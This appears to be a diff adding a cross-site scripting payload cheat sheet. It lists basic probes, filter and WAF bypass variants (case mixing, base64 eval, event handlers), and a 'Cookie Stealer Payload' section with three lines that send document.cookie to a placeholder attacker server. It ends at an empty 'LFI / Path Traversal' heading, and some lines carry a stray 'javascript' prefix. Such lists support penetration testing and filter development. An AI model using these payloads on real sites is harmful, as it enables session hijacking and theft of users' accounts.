@@ -1,0 +1,34 @@
+XSS
+Basic Probes
+javascript<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+javascript:alert(1)
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+Filter Bypass
+javascript<ScRiPt>alert(1)</sCrIpT>
+<script>alert`1`</script>
+<img src=x onerror="alert&#40;1&#41;">
+<svg/onload=alert(1)>
+<<script>alert(1)//<</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>  # base64: alert(1)
+<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>
+
+# No parentheses
+<img src=x onerror="window['ale'+'rt'](1)">
+<svg onload=alert`1`>
+
+# WAF bypass
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+Cookie Stealer Payload
+javascript<script>fetch('https://yourserver.com/steal?c='+document.cookie)</script>
+<img src=x onerror="new Image().src='https://yourserver.com/?c='+document.cookie">
+<script>document.location='https://yourserver.com/?c='+document.cookie</script>
+
+LFI / Path Traversal
